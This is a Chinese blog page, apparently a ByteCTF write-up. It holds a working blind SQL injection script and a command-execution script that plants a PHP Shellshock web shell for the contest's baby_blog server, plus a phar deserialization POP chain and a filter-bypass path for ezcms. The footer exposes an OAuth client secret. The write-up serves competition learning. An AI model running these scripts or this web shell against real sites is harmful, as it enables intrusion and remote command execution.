@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>bytectf wp | oxcccccc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="bytectf wpwebbaby_blog在edit.php中: if($_SESSION[&#39;id&#39;] &#x3D;&#x3D; $row[&#39;userid&#39;]){         $title &#x3D; addslashes($_POST[&#39;title&#39;]);         $content &#x3D; addslashes($_POST[&#39;content&#39;]);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bytectf wp">
+<meta property="og:url" content="https://www.ccreater.top/1970/01/01/bytectfwp/index.html">
+<meta property="og:site_name" content="oxcccccc">
+<meta property="og:description" content="bytectf wpwebbaby_blog在edit.php中: if($_SESSION[&#39;id&#39;] &#x3D;&#x3D; $row[&#39;userid&#39;]){         $title &#x3D; addslashes($_POST[&#39;title&#39;]);         $content &#x3D; addslashes($_POST[&#39;content&#39;]);">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-20T12:51:06.027Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png">
+  
+    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oxcccccc</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/bytectfwp/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      bytectf wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
+<pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){
+        $title = addslashes($_POST[&#39;title&#39;]);
+        $content = addslashes($_POST[&#39;content&#39;]);
+        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);
+    }</code></pre>
+<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
+<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
+<p>sql盲注判断脚本:</p>
+<pre><code class="python">import requests
+from bs4 import BeautifulSoup
+anti_disturb_key=&#39;cjb_ccreater_s_test&#39;
+PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;
+check_article_id=20
+def check(check_title):
+    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)
+    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
+    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]
+    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text
+    if title[:len(anti_disturb_key)]!=anti_disturb_key :
+        return &#39;disturb&#39;
+    elif content!=&#39;success&#39;+check_title:
+        return &#39;false&#39;
+    else :
+        return &#39;success&#39;
+
+
+
+def make_write(title,info):
+    data={
+        &#39;title&#39;:title,
+        &#39;content&#39;:info
+    }
+    url=&#39;http://112.125.24.134:9999/writing.php&#39;
+    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    if res.status_code==200:
+        return True
+    else :
+        return False
+
+def get_newest_id():
+    url=&#39;http://112.125.24.134:9999/index.php&#39;
+    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
+    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]
+    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]
+    return int(newest_id)
+
+def sql_inject(sql):
+    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;
+    info=&#39;success&#39;+title
+    if make_write(title,info):
+        #编辑id=newest_id的文章来读取$raw[&#39;title&#39;]
+        newest_id=get_newest_id()
+        url=&#39;http://112.125.24.134:9999/edit.php&#39;
+        data={
+            &#39;title&#39;:title,
+            &#39;content&#39;:info,
+            &#39;id&#39;:newest_id
+        }
+        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)
+        #判断盲注结果
+        result=check(title)
+        if result==&#39;success&#39;:
+            return True
+        elif result==&#39;disturb&#39;:
+            print(&quot;受到干扰,重新执行&quot;)
+            return sql_inject(sql)
+        else :
+            return False
+    else :
+        print(&#39;程序执行错误,请保持结果&#39;)
+        eval(input(&#39;执行命令:&#39;))
+
+#demo 
+#sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;
+sql=&#39;&#39;&#39;
+(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess 
+&#39;&#39;&#39;
+### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67
+#猜information_schema表名
+#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b
+result=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;
+
+index=len(result)
+while 1:
+    index+=1
+    temp=sql.replace(&#39;index&#39;,str(index))
+    for i in range(20):
+        print(&quot;猜测第&quot;+str(index)+&quot;位为:&quot;+str(i))
+        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):
+            result+=hex(i)[2:]
+            break
+    print(result)
+    res=&#39;&#39;
+    for i in range(0,len(result),2):
+        res+=chr(int(result[i:i+2],16))
+    print(res)
+
+</code></pre>
+<p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>绕过正则过滤</p>
+<p>拿到vip账号:wulax,密码:1,网址:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p>
+<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
+<p>命令执行利用脚本:</p>
+<pre><code class="python">import requests
+
+url=&quot;http://112.126.101.16:9999&quot;
+arc_id=&quot;11&quot;
+session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;
+text=&#39;&#39;&#39;
+&lt;?php 
+# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+# Google Dork: none 
+# Date: 10/31/2014 
+# Exploit Author: Ryan King (Starfall) 
+# Vendor Homepage: http://php.net 
+# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+# Version: 5.* (tested on 5.6.2) 
+# Tested on: Debian 7 and CentOS 5 and 6 
+# CVE: CVE-2014-6271 
+
+function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
+   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
+   $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;; 
+    $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;
+    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;; 
+
+   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
+   // In Safe Mode, the user may only alter environment variableswhose names 
+   // begin with the prefixes supplied by this directive. 
+   // By default, users will only be able to set environment variablesthat 
+   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+   // PHP will let the user modify ANY environment variable! 
+   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail 
+   $output = @file_get_contents($tmp); 
+   @unlink($tmp); 
+   if($output != &quot;&quot;) return $output; 
+   else return &quot;No output, or not vuln.&quot;; 
+} 
+echo shellshock($_REQUEST[&quot;cmd&quot;]); 
+?&gt;
+&#39;&#39;&#39;
+def edit():
+    data={
+        &quot;title&quot;:&quot;bbb&quot;,
+        &quot;content&quot;:&quot;b&quot;,
+        &quot;id&quot;:arc_id
+    }
+    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
+def exec(s):
+    data={
+        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,
+        &quot;regex&quot;:&quot;1&quot;,
+        &quot;id&quot;:arc_id,
+        &quot;find&quot;:&quot;b/e\x00&quot;,
+        &quot;cmd&quot;:&quot;ls -al&quot;,
+        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;
+    }
+    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
+    edit()
+    return result
+while 1:
+    print(exec(input()).text)</code></pre>
+<p>emmmm..到这里就不会做了.到头了.</p>
+<p>后来发现有个antsystem()</p>
+<p>vardump(antsystem(‘/readfile’));</p>
+<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
+<p>代码审计发现</p>
+<p>在config.php下</p>
+<pre><code class="php">class File{
+    public $filename;
+    public $filepath;
+    public $checker;
+    function __construct($filename, $filepath)
+    {
+        $this-&gt;filepath = $filepath;
+        $this-&gt;filename = $filename;
+    }
+    function __destruct()
+    {
+        if (isset($this-&gt;checker)){
+            $this-&gt;checker-&gt;upload_file();
+        }
+    }
+    public function view_detail(){
+
+        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){
+            die(&quot;nonono~&quot;);
+        }
+        $mine = mime_content_type($this-&gt;filepath);
+        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);
+        $res[&#39;mine&#39;] = $mine;
+        $res[&#39;store_path&#39;] = $store_path;
+        return $res;
+
+    }
+}</code></pre>
+<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
+<p>最后在view.php处找到调用view_detail的地方</p>
+<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
+<p>所以我们可以可以试着删除它</p>
+<p>构造pop链:</p>
+<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
+<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
+<p>我觉得这才是这一题最骚的地方:</p>
+<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
+<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
+<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
+<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
+<p>然后手动pk :D</p>
+<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/bytectfwp/">https://www.ccreater.top/1970/01/01/bytectfwp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/bytectfwp/" data-id="ckmn5756u004zs1ni1wsfg0wv" data-title="bytectf wp" class="article-share-link">Share</a>
+      
+	  
+			  
+				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '2928409e787d74264ece',
+        clientSecret: '8e2a058971b6fac2da6dd1fb6e8233aaf095a7b5 ',
+        id: md5(window.location.pathname),
+        repo: 'ccreater222.github.io',
+        owner: 'ccreater222',
+        admin: 'ccreater222',
+        distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+</script>
+				
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/1970/01/01/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ciscn2020预选赛
+        
+      </div>
+    </a>
+  
+  
+    <a href="/1970/01/01/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">coursera-杜克大学 程序设计与 Web 入门</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
+          </li>
+        
+          <li>
+            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
+          </li>
+        
+          <li>
+            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
+          </li>
+        
+          <li>
+            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+          </li>
+        
+          <li>
+            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
